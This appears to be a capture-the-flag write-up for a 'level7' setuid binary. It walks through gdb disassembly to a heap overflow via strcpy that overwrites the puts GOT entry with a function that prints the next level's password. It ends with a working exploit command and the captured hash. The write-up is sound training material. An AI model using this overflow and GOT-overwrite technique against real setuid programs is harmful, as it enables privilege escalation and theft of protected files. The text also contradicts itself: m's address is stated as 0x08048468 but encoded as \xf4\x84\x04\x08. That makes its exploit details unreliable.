Execute the *level7* binary:

```bash
./level7
./level7 arg_1
./level7 arg_1 arg_2
```

```
Segmentation fault (core dumped)
Segmentation fault (core dumped)
~~
```

> Note the *level7* binary need two arguments.

```gdb
disass main
```

> Use __set disassembly-flavor intel__ command to set the intel syntax.

```
Dump of assembler code for function main:
...
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>   ; alloc 8 bytes (first)
...
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>   ; alloc 8 bytes (second)
...
    0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx  ; put the second allocation in the
...                                                     ; first one (in the second byte)
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>   ; alloc 8 bytes (third)
...
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>   ; alloc 8 bytes (fourth)
...
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx  ; put the fourth allocation in the
...                                                     ; third one (in the second byte)
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>   ; copy argv[0] in the second allocation
...
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>   ; copy argv[1] in the fourth allocation
...
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>    ; open the "/home/user/level8/.pass" file
...
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>    ; read the "/home/user/level8/.pass" opened file
...                                                     ; in the global variable "c"
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>     ; write "~~" to stdout
...
   0x08048602 <+225>:	ret
End of assembler dump.
```

The interesting point is the that the *"/home/user/level8/.pass"* is readed for us, and put in the global variable "__c__".

The goal now is to print this global variable "__c__".

Check for other interisting functions, maybe for print the global variable "__c__":

```gdb
info functions
```

```
All defined functions:

...
0x08048468  m
0x0804847c  main
...
```

Check the *m* function:

```gdb
disass m
```

```
Dump of assembler code for function m:
...
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax          ; put in the third  argument the time since the epoch
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960    ; put in the second argument the global variable m
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx              ; put in the first  argument the string "%s - %d\n"
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>           ; call printf with these arguments
...
End of assembler dump.
```

The *m* function at the address __0x08048468__ is exactly what we need to print the global variable "__c__".

Because the *fgets* function is not protected against overflows like seen in some previous levels, it's possible to overwrite the address called in the *puts@plt* function to the *m* function with a [got overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628) function.

Find the *puts@plt* jump address:

```gdb
x/4i 0x8048400
```

```
0x8048400 <puts@plt>:	        jmp    DWORD PTR ds:0x8049928
0x8048406 <puts@plt+6>:	        push   0x28
0x804840b <puts@plt+11>:	    jmp    0x80483a0
0x8048410 <__gmon_start__@plt>:	jmp    DWORD PTR ds:0x804992c
```

The address of the first jump instruction of *puts@plt* to replace is __0x08049928__ (pointing to *puts@got.plt* by default).

> Note this address is stored in the *.got.plt* section (*info file*).

Check the four addresses returned by the calls of malloc:

```gdb
break *0x08048536
break *0x08048550
break *0x08048565
break *0x0804857f
run
info register eax
continue
info register eax
continue
info register eax
continue
info register eax
continue
```

```
eax            0x804a008        134520840
eax            0x804a018        134520856
eax            0x804a028        134520872
eax            0x804a038        134520888
```

The malloc calls return always the same addresses because the [ASLR](https://www.techtarget.com/searchsecurity/definition/address-space-layout-randomization-ASLR#:~:text=Address%20space%20layout%20randomization%20(ASLR)%20is%20a%20memory%2Dprotection,executables%20are%20loaded%20into%20memory.) is not active:

```bash
file ./level7
```

```
./level7: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xaee40d38d396a2ba3356a99de2d8afc4874319e2, not stripped
```

> *LSB executable* means the program [doesn't implement ASLR](https://unix.stackexchange.com/questions/89211/how-to-test-whether-a-linux-binary-was-compiled-as-position-independent-code).

The solution is to overflow the first *strcpy* with the first binary argument (argv\[1\]) to change the destination address of the second one, and put for it the *m* function address with the second binary argument (argv\[2\]).

Find the offset of the first strcpy call to reach the second one:


```gdb
break *0x080485bd
run AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP ....
info register esp
x/x 0xbffff5d0
```

```
esp            0xbffff5d0	0xbffff5d0
0xbffff5d0:	0x46464646
```

> The destination string address argument from the esp (*0xbffff5d0*) register for the *strcpy* call is __0x46464646__, corresponding to the *"FFFF"* part of the first argument, meaning that the length of the offset is __20 bytes__.


- Put the __20__ padding bytes/characters in the first argument to reach the third allocated address containing the address where the value of the second argument will be copied.
- Add the address __0x08049928__ of the *@plt jump* which needs to be replaced (reversed = \x28\x99\x04\x08).
- Put the address __0x08048468__ of the of the *m* function to overwrite the default one (*puts@got.plt*) (reversed  = \xf4\x84\x04\x08).

```bash
./level7 `echo -e "....................\x28\x99\x04\x08"` `echo -e "\xf4\x84\x04\x08"`
```

```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1670594917
```
